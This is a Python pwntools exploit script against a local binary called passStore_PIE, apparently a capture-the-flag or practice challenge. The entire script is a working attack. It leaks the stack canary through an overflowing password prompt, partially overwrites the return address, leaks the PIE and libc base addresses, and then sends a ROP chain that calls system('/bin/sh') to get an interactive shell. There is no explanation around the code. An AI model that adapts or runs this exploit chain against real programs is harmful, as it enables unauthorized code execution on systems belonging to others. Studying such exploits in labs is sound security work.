from pwn import *

binary = ELF('./passStore_PIE')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

payload1 = b"a"*56
r.sendlineafter(b"Type the password: ",payload1)
r.recvline()

canary = b"\x00"  +  r.recv(7).split(b"\n")[0] 
canary += b"\x00"*(8 - len(canary))
log.info("Leaked canary: " + str(hex(u64(canary))))


payload2 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p8(0x8d)
r.sendafter(b"Retype: ",payload2)


payload3 = b"a"*72
r.sendafter(b"Type the password:",payload3)


res = r.recvline().split(b"a"*72)[1] 
res = res.split(b"\n")[0]
res += b"\x00"*(8 - len(res))

main_addr_pie = u64(res) - 0x3a 
log.info("Main addr (pie) leak : " + hex(main_addr_pie)) 
main_offset_pie = binary.symbols['main']
pie_base = main_addr_pie - main_offset_pie
log.info("Main offset pie : " + hex(main_offset_pie)) 
log.info("Pie base addr : " + hex(pie_base)) 

payload4 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p8(0x8d)
r.sendafter(b"Retype: ",payload4)


payload5 = b"a"*248
r.sendlineafter(b"Type the password:",payload5)
r.recvline()

res = r.recv().split(b"\nRetype")[0] 
res += b"\x00"*(8 - len(res))
leak = (u64(res) << 8) + 0x0a 
_libc_start_main_addr = leak - 0x4a 
libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
log.info("Libc base addr : " + hex(libc_base)) 

system_offset = libc.symbols['system'] 
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_offset = rop.find_gadget(['ret'])[0] 

pop_rdi_ret_addr = pie_base + pop_rdi_ret_offset
ret_addr = pie_base + ret_offset
log.info("pop rdi ; ret addr : " + hex(pop_rdi_ret_addr)) 
log.info("ret addr : " + hex(ret_addr)) 

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info("system addr : " + hex(system_addr)) 
log.info("/bin/sh addr : " + hex(binsh_addr)) 

junk = b"a"*56 + p64(u64(canary)) + b"a"*8 
payload6 = junk + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload6)
r.interactive()
